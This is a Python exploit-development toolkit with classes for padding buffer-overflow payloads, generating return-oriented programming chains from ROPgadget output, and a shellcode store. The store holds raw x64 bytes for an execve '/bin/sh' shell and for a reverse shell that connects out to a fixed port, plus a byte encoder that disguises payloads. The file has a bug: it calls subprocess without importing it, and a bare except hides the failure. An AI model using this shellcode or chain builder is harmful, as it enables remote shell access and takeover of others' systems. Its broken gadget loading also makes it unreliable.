import struct
import os
from pathlib import Path

class Payload:
    def __init__(self, arch="x64"):
        self.arch = arch
        self.chain = b""
        self.gadgets = {}
        
    def add(self, data):
        self.chain += data
        
    def pad(self, size):
        self.chain += b"A" * size
        
    def qword(self, val):
        self.chain += struct.pack("<Q", val)
        
    def dword(self, val):
        self.chain += struct.pack("<I", val)

class ROPGen:
    def __init__(self, binary_path):
        self.bin = binary_path
        self.gadgets = {}
        self.base = 0
        self._load_gadgets()
        
    def _load_gadgets(self):
        # use ROPgadget to find all gadgets
        try:
            out = subprocess.check_output(["ROPgadget", "--binary", self.bin], 
                                        stderr=subprocess.STDOUT, text=True)
            for line in out.split("\n"):
                if "0x" in line and ":" in line:
                    addr, gadget = line.split(" : ", 1)
                    addr = int(addr, 16)
                    self.gadgets[gadget.strip()] = addr
        except:
            pass
            
    def find(self, pattern):
        for g, addr in self.gadgets.items():
            if pattern in g:
                return addr + self.base
        return 0
        
    def chain(self, gadgets):
        p = Payload()
        for g in gadgets:
            if isinstance(g, str):
                addr = self.find(g)
                p.qword(addr)
            elif isinstance(g, int):
                p.qword(g)
            elif isinstance(g, bytes):
                p.add(g)
        return p.chain

class Shellcode:
    x64_execve = (
        b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
        b"\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    )
    
    x64_reverse = (
        b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
        b"\x02\x5f\x6a\x01\x5e\x6a\x02\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
        b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
        b"\x02\x15\xb3\x41\x54\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xf6"
        b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff"
        b"\x57\x57\x5e\x5a\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
        b"\x5f\x6a\x3b\x58\x0f\x05"
    )
    
    @staticmethod
    def encode(data, key=0x41):
        encoded = b""
        for b in data:
            encoded += bytes([(b + key) & 0xff])
        return encoded
